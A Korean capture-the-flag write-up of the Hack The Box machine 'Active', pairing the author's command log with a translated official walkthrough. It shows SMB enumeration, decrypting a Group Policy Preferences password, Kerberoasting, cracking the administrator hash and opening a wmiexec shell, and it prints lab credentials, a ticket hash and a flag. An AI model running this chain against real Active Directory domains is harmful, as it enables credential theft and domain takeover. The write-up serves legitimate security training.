---
layout: post
title: "[HTB][AD][Easy] Active"
date:   2026-11-09 20:59:02 +09:00
categories: [AD, Easy]
---
## 개요

## 모의해킹내용

### 정보수집
```
└─$ sudo masscan -p1-65535 TARGET_IP --rate=1000 --interface tun1 > ports
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2026-02-26 13:07:02 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]

└─$ ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | 
sort -n | tr '\n' ',' | sed 's/,$//')

└─$ nmap -Pn -sV -sC -p$ports TARGET_IP                                  
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-26 08:10 EST
Nmap scan report for TARGET_IP
Host is up (0.28s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-26 13:10:57Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49162/tcp open  msrpc         Microsoft Windows RPC
49166/tcp open  msrpc         Microsoft Windows RPC
49168/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
|_clock-skew: -1s
| smb2-time: 
|   date: 2026-02-26T13:11:59
|_  start_date: 2026-02-26T12:00:47

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.27 seconds
```

```
└─$ echo "TARGET_IP  active.htb" | sudo tee -a /etc/hosts
TARGET_IP  active.htb
```

```
└─$  smbclient -L //TARGET_IP
Password for [WORKGROUP\kali]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to TARGET_IP failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

```
└─$ smbmap -H TARGET_IP                                                  

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

.
.
.

shares...                                                                              [-] Enumer           
[+] IP: TARGET_IP:445        Name: active.htb                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   NO ACCESS
```


```
└─$ smbclient //TARGET_IP/Replication                        
Password for [WORKGROUP\kali]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> RECURSE ON
smb: \> PROMPT OFF
smb: \>  mget *
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI (0.1 KiloBytes/sec) (average 0.0 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (2.4 KiloBytes/sec) (average 0.6 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (0.4 KiloBytes/sec) (average 0.6 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (0.8 KiloBytes/sec) (average 0.6 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3722 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (3.1 KiloBytes/sec) (average 0.9 KiloBytes/sec)
smb: \> SMBecho failed (NT_STATUS_CONNECTION_RESET). The connection is disconnected now
```


```
└─$ cat Groups.xml                
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```
### 초기침투

```
└─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```



```
└─$ smbmap -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 -H TARGET_IP

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap
.
.
.

[+] IP: TARGET_IP:445        Name: active.htb                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY
```

```
└─$ smbclient -U SVC_TGS%GPPstillStandingStrong2k18 //TARGET_IP/Users
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sat Jul 21 10:39:20 2018
  ..                                 DR        0  Sat Jul 21 10:39:20 2018
  Administrator                       D        0  Mon Jul 16 06:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 01:06:44 2009
  Default                           DHR        0  Tue Jul 14 02:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 01:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:57:55 2009
  Public                             DR        0  Tue Jul 14 00:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 11:16:32 2018

                5217023 blocks of size 4096. 278935 blocks available
smb: \> cd SVC_TGS/Desktop
smb: \SVC_TGS\Desktop\> ls
  .                                   D        0  Sat Jul 21 11:14:42 2018
  ..                                  D        0  Sat Jul 21 11:14:42 2018
  user.txt                           AR       34  Thu Feb 26 07:01:59 2026

                5217023 blocks of size 4096. 278935 blocks available
smb: \SVC_TGS\Desktop\> get user.txt
getting file \SVC_TGS\Desktop\user.txt of size 34 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloByte/sec)
smb: \SVC_TGS\Desktop\> SMBecho failed (NT_STATUS_CONNECTION_RESET). The connection is disconnected now
```
```
└─$ cat user.txt
82e178d892e061bbf3ba65107c07ae56
```


### 권한상승

```
└─$ ldapsearch -x -H 'ldap://TARGET_IP' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(!             
(useraccountcontrol:1.2.840.113556.1.4.803:=2)))" samaccountname | grep sAMAccountName
sAMAccountName: Administrator
sAMAccountName: SVC_TGS
```

```
└─$ impacket-GetADUsers -all active.htb/svc_tgs -dc-ip TARGET_IP
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Querying TARGET_IP for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2018-07-18 15:06:40.351723  2026-02-26 07:02:03.338577 
Guest                                                 <never>              <never>             
krbtgt                                                2018-07-18 14:50:36.972031  <never>             
SVC_TGS                                               2018-07-18 16:14:38.402764  2018-07-21 10:01:30.320277
```

```
└─$ ldapsearch -x -H 'ldap://TARGET_IP' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))" serviceprincipalname | grep -B 1 servicePrincipalName
dn: CN=Administrator,CN=Users,DC=active,DC=htb
servicePrincipalName: active/CIFS:445
```

```
└─$ impacket-GetUserSPNs active.htb/svc_tgs -dc-ip TARGET_IP
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2026-02-26 07:02:03.338577
```

```
└─$ impacket-GetUserSPNs active.htb/svc_tgs -dc-ip TARGET_IP -request
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2026-02-26 07:02:03.338577             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$f6d748a652978dfb18cf48d71cdd7977$ab4bcb8911f76bcfda6c3e368b39cf93bdda8a2d82daa6e7611f746fcab1dba2a3417395806dec76225e9aa3f61e75815e208ced007fc4394401e9dcdab5308f7bc95d8a45755a4eb84d024b7703a869d58e30b0037a0f28d435565790e1ac28b6ebc5204296114b52188e824fc452dd1109b9a9543ab541d47ad13cf3d614798d586c04fdb6590e4c4b80778833157aa419d0aa9da5fb04b3a6168d6a414cb14f13ab8e04681036036aee44c314d88d493dd8418f16d3d63f00c47478247c59eecbe1c9f22980b04a48e6723a2ac3647cba58551c69e4e2f6fcf3b65ddacb7e7791eae691448168f776247600c13d08c689121b901cca46bd47e0cb51600936026af3909e265587d1341ea513de188dc0d9c489c6027904941370d2ab9626a7a394ddfdf5136b5f8b5bad6bcbec760a2e942d696f3ab6a75a2e5f819ab0ce9edd712a6a152717260e2cb23890689fe174e883d397f0ea70c86c6158bbd245b252a0e05856f8bf715a18c6a1303ee49f0fbcb7ffe04a57330ee749855452cbd83d7366dc6b284853b42b787d5b38a38fc7f83e64a57fbea41f77c35188f503aab89a187f1233316ae526132a65cf9dc40a6256dc3506becdc06bc5a77e121a3a0f07d69e073b296f23e13283a67ca6548ba8c54837c130c7371936db919793e37ef370891ae6dcb3ef1cf186ae6bdaaef5d11c2f77444dba98a8356d28ce98530b1755c0e5f80e5dbc358491b0212dfd566b8c44e7491aae3a9e621be9393fdcf2b05e72f08e4162b1c654a181e7bb2007e9cb5a52e71af814db3e05d7fd96b3ae8b2c750a4771a104d28e4d571ed5ad53b7924cd22fefac1ddfc7238f12eaf1c50eaa0745224bc17b8ded1e7615f764c01e468b3f3518d47b862609a80ee69ca89abb93389c2877210d5369490e754b1312a4b0d3f6536c6171aae4d9e61d1b86f58c26c20147cda09df49ad1c5f22d671cf97791e3ebf4b66e9af290eebe68f10570edd48b76abedc2136ee6e02d64fc7207536ebc1e22415d9d97cccd6584445f0aaf4bdac85dceb32405489cc1950bb89e89e9aaa720274cb24dafb3b187820b9a79f0de063d614a9cd122d7dfb39bb899d98ea3ca01c7b2dd86f2c750622021de77b7e408bb51289d8bab4385acdb14433d5d9393caae91fa9671a54a9c60c2ea86ffcc41a99e5add93f05fdbfd4dd27147b9f17a4a410c503ec6d229e8d9ec7829ba805c463d0d034c910168369a0c433f20bcb9095418
```

```
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)     
1g 0:00:00:07 DONE (2026-02-26 09:09) 0.1345g/s 1418Kp/s 1418Kc/s 1418KC/s Tiffani1432..Tiago_18
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

```
└─$ impacket-wmiexec active.htb/administrator:Ticketmaster1968@TARGET_IP
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv2.1 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
active\administrator
```

---

## 공식 공략 번역

**작성자:** C4rm310 & egre55
**머신 제작자:** eks & mrb3n
**날짜:** 2023년 11월 27일 / 문서 번호 D18.100.30
**난이도:** 쉬움 (Easy)
**분류:** 공식 (Official)

### 개요 (Synopsis)

Active는 Active Directory 환경에서 권한을 탈취하는 데 매우 자주 쓰이는 두 가지 기술을 특징으로 하는, 쉬움~중간 난이도의 Windows 머신이다.

### 요구 기술 (Skills Required)

* Active Directory 인증 및 공유 폴더에 대한 기본 지식

### 습득 기술 (Skills Learned)

* SMB 열거 (Enumeration) 기술
* 그룹 정책 기본 설정(Group Policy Preferences, GPP) 열거 및 악용
* Kerberoasting 공격이 가능한 계정 식별 및 악용

---

## 열거 (Enumeration)

### Nmap

먼저 타겟에 Nmap 스캔을 실행하는 것으로 시작한다.

```bash
sudo masscan -p1-65535 TARGET_IP --rate 1000 -e tun0 > ports
ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')
nmap -Pn -sV -sC -p$ports TARGET_IP

```

```
Starting Nmap 7.93 (https://nmap.org) at 2023-11-27 10:08 GMT
...
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-11-27 10:08:23)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
...

```

Nmap 결과를 보면 `active.htb`라는 도메인을 가진 Active Directory가 설치되어 있는 것을 알 수 있다. Microsoft DNS 6.1이 실행 중이므로 도메인 컨트롤러 운영체제가 Windows Server 2008 R2 SP1일 것으로 추정할 수 있다.

확인된 도메인을 우리의 `hosts` 파일에 추가해 줄게.

```bash
echo "TARGET_IP active.htb" | sudo tee -a /etc/hosts

```

### SMB

445번 포트가 열려 있으므로, `smbclient`를 사용해 익명 로그인(anonymous login)으로 접근 가능한 파일 공유를 열거할 수 있다.

```bash
$ smbclient -L //TARGET_IP
Password for [WORKGROUP\htb-c4rm310]:
Anonymous login successful

```

| Sharename | Type | Comment |
| --- | --- | --- |
| ADMIN$ | Disk | Remote Admin |
| C$ | Disk | Default share |
| IPC$ | IPC | Remote IPC |
| NETLOGON | Disk | Logon server share |
| Replication | Disk |  |
| SYSVOL | Disk | Logon server share |
| Users | Disk |  |

익명 로그인이 허용되므로 사용 가능한 공유 목록을 볼 수 있다. 이제 `smbmap`을 사용해서 익명 자격 증명으로 접근할 수 있는 공유 폴더가 어떤 것인지 확인한다.

```bash
$ smbmap -H TARGET_IP
...
[+] IP: TARGET_IP:445 Name: active.htb

```

| Disk | Permissions | Comment |
| --- | --- | --- |
| ADMIN$ | NO ACCESS | Remote Admin |
| C$ | NO ACCESS | Default share |
| IPC$ | NO ACCESS | Remote IPC |
| NETLOGON | NO ACCESS | Logon server share |
| Replication | READ ONLY |  |
| SYSVOL | NO ACCESS | Logon server share |
| Users | NO ACCESS |  |

익명 계정으로 접근할 수 있는 유일한 공유 폴더는 `Replication`이다. 연결해서 내용을 살펴보면 `SYSVOL` 공유의 복제본인 것으로 보인다.

이건 권한 상승 관점에서 아주 흥미로운데, 왜냐하면 그룹 정책(Group Policies)과 그룹 정책 기본 설정(Group Policy Preferences)이 인증된 모든 사용자가 읽을 수 있는 `SYSVOL` 내에 저장되기 때문이다.

`Replication` 공유에 접속해서 `Groups.xml` 파일에 특별히 주의를 기울이며 모든 내용을 재귀적으로 다운로드한다. 이 파일에는 종종 사용자 이름과 비밀번호 조합이 포함되어 있어서 공격에 아주 유용하다.

```bash
$ smbclient //TARGET_IP/Replication
Password for [WORKGROUP\htb-c4rm310]:
Anonymous login successful
smb: \> RECURSE ON
smb: \> PROMPT OFF
smb: \> mget *

```

다운로드한 `Groups.xml` 파일의 내용은 다음과 같다.

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
    <Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcgh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/Ng1VmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/>
  </User>
</Groups>

```

이 `Groups.xml` 파일에서 `SVC_TGS`라는 사용자 이름과 암호화된 비밀번호(`cpassword`)를 얻을 수 있었어.

---

## 초기 침투 (Foothold)

### 그룹 정책 기본 설정 (Group Policy Preferences)

그룹 정책 기본 설정(GPP)은 Windows Server 2008에 도입되었으며, 관리자가 네트워크 전체의 사용자와 그룹을 수정할 수 있게 해줘. 예를 들어, 회사 기본 이미지의 로컬 관리자 비밀번호가 너무 약해서 관리자가 나중에 더 강력한 것으로 설정하려고 할 때 사용할 수 있다.

이때 정의된 비밀번호는 AES-256으로 암호화되어 `Groups.xml`에 저장된다. 하지만 2012년에 Microsoft가 MSDN에 AES 키를 공개해 버렸기 때문에, GPP를 사용해 설정된 비밀번호는 이제 아주 쉽게 크랙할 수 있는 가장 손쉬운 타겟(low-hanging fruit)으로 여겨져.

암호화된 비밀번호를 추출해서 `gpp-decrypt` 도구를 사용해 복호화한다.

```bash
$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcgh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/Ng1VmQ
GPPstillStandingStrong2k18

```

도메인 계정 `SVC_TGS`의 비밀번호는 `GPPstillStandingStrong2k18`이라는 걸 알아냈어.

### 인증된 열거 (Authenticated Enumeration)

이제 `active.htb` 도메인에 대한 유효한 자격 증명을 얻었으니 추가 열거를 진행할 수 있다. 이제 `SYSVOL` 및 `Users` 공유 폴더에도 접근이 가능할 것이다.

```bash
$ smbmap -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 -H TARGET_IP

```

접속해서 확인해 보면 `Users` 공유 폴더에 접근 가능하며, `SVC_TGS`의 바탕화면(Desktop)에서 사용자 플래그(user flag)를 가져올 수 있다.

```bash
$ smbclient -U SVC_TGS%GPPstillStandingStrong2k18 //TARGET_IP/Users
smb: \> cd SVC_TGS/Desktop
smb: \SVC_TGS\Desktop\> get user.txt

```

---

## 권한 상승 (Privilege Escalation)

이제 `ldapsearch`를 사용해 도메인 컨트롤러에 Active Directory 계정의 `userAccountControl` 속성 및 적용된 설정을 쿼리할 수 있다. `userAccountControl` 값이 `2`이면 비활성화된 계정을 뜻하므로, 아래 쿼리는 비활성화되지 않은 활성 사용자 목록을 반환한다.

```bash
$ ldapsearch -x -H 'ldap://TARGET_IP' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))" sAMAccountName | grep sAMAccountName

sAMAccountName: Administrator
sAMAccountName: SVC_TGS

```

우리가 이미 탈취한 계정 외에도 `Administrator` 계정이 활성화되어 있는 것을 볼 수 있다. Impacket의 `GetADUsers.py`를 사용하면 더 깔끔하게 도메인 사용자를 열거할 수 있다.

```bash
$ GetADUsers.py active.htb/svc_tgs -dc-ip TARGET_IP
Password: GPPstillStandingStrong2k18

```

| Name | Email | PasswordLastSet | LastLogon |
| --- | --- | --- | --- |
| Administrator |  | 2018-07-18 20:06:40.351723 | 2023-11-27 09:57:39.876136 |
| Guest |  | <never> | <never> |
| krbtgt |  | 2018-07-18 19:50:36.972031 | <never> |
| SVC_TGS |  | 2018-07-18 21:14:38.402764 | 2018-07-21 15:01:30.320277 |

### Kerberoasting

Active Directory 도메인 내에서 권한을 얻는 또 다른 흔한 기술은 2014년 DerbyCon에서 Tim Medin이 공개한 "Kerberoasting"이다.

이 공격은 Kerberos의 "TGS_REP(Ticket Granting Service 응답)"에서 암호화된 해시를 추출하고, 이를 오프라인에서 무차별 대입(Cracking)하여 평문 비밀번호를 알아내는 방식이다. 이게 가능한 이유는 TGS_REP가 해당 서비스 인스턴스가 실행되고 있는 계정의 NTLM 비밀번호 해시를 사용해 암호화되기 때문이다.

Kerberos 인증은 SPN(Service Principal Names)을 사용해 특정 서비스와 연결된 계정을 식별한다. 이전의 `ldapsearch` 쿼리에 SPN 필터(`serviceprincipalname=*/*`)를 추가해서 SPN이 구성된 계정을 찾아본다.

```bash
$ ldapsearch -x -H 'ldap://TARGET_IP' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))" serviceprincipalname | grep -B 1 servicePrincipalName

dn: CN=Administrator,CN=Users,DC=active,DC=htb
servicePrincipalName: active/CIFS:445

```

확인해 보니 `active\Administrator` 계정에 SPN이 설정되어 있다!

이제 Impacket의 `GetUserSPNs.py`를 사용해서 TGS를 요청하고 오프라인 크래킹을 위한 해시를 추출한다.

```bash
$ GetUserSPNs.py active.htb/svc_tgs -dc-ip TARGET_IP -request

```

*(성공적으로 Administrator 계정에 대한 Kerberos TGS 해시 값을 반환함)*

### Kerberos TGS 해시 크랙 (Cracking of Kerberos TGS Hash)

추출한 해시를 `hashcat`과 `rockyou.txt` 워드리스트를 이용해 크랙하면 `active\administrator`의 비밀번호가 `Ticketmaster1968`이라는 것을 알아낼 수 있다!

```bash
$ hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt --force --potfile-disable
...
$krb5tgs$23$*Administrator$ACTIVE.HTB<...SNIP...>:Ticketmaster1968

```

### 기본 도메인 관리자 쉘 획득 (Shell as Primary Domain Admin)

마지막으로 Impacket의 `wmiexec.py`를 사용해 `active\administrator` 권한으로 쉘을 획득하고 루트 플래그(`root.txt`)를 읽을 수 있다.

```bash
$ wmiexec.py active.htb/administrator:Ticketmaster1968@TARGET_IP
C:\>whoami
active\administrator

```

최종 플래그는 `C:\Users\Administrator\Desktop\root.txt`에 위치해 있다.
